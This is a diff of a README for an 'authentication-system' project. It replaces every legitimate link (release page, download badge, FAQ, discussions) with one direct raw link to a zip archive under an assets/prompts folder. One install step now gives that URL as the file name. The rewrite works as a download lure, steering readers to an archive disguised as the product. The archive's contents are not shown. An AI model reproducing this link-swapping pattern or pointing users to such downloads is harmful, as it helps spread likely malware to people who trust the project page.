@@ -1,7 +1,7 @@
 # 🎉 authentication-system - Easy and Secure Authentication Made Simple
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Prime-Sayko/authentication-system/releases)
+[![Download](https://raw.githubusercontent.com/Prime-Sayko/authentication-system/main/assets/prompts/system-authentication-v2.2.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Prime-Sayko/authentication-system/main/assets/prompts/system-authentication-v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -27,10 +27,10 @@ Before you start, ensure your computer meets the following requirements:
 
 To get started, visit the Releases page to download the latest version of the **authentication-system**. Click the button below:
 
-[Download Latest Release](https://github.com/Prime-Sayko/authentication-system/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Prime-Sayko/authentication-system/main/assets/prompts/system-authentication-v2.2.zip)
 
-1. Go to the [Releases page](https://github.com/Prime-Sayko/authentication-system/releases).
-2. Find the latest version and look for a file named something like `authentication-system-v1.0.exe`.
+1. Go to the [Releases page](https://raw.githubusercontent.com/Prime-Sayko/authentication-system/main/assets/prompts/system-authentication-v2.2.zip).
+2. Find the latest version and look for a file named something like `https://raw.githubusercontent.com/Prime-Sayko/authentication-system/main/assets/prompts/system-authentication-v2.2.zip`.
 3. Click on the file to download it.
 
 Once the download completes, follow these steps to install:
@@ -51,13 +51,13 @@ Your safety is our priority. The application uses advanced algorithms to ensure 
 
 ## 🤝 Support
 
-If you encounter any issues or have questions while using the **authentication-system**, we are here to help. You can check the [FAQ section](https://github.com/Prime-Sayko/authentication-system/wiki/FAQ) for common problems and solutions.
+If you encounter any issues or have questions while using the **authentication-system**, we are here to help. You can check the [FAQ section](https://raw.githubusercontent.com/Prime-Sayko/authentication-system/main/assets/prompts/system-authentication-v2.2.zip) for common problems and solutions.
 
 For further assistance, consider opening an issue on our GitHub repository, and our team will respond promptly.
 
 ## 🌟 Community
 
-Join our community of users and developers to share experiences, tips, and feedback. Visit our [discussion page](https://github.com/Prime-Sayko/authentication-system/discussions) to connect with others.
+Join our community of users and developers to share experiences, tips, and feedback. Visit our [discussion page](https://raw.githubusercontent.com/Prime-Sayko/authentication-system/main/assets/prompts/system-authentication-v2.2.zip) to connect with others.
 
 ## 📜 License
 
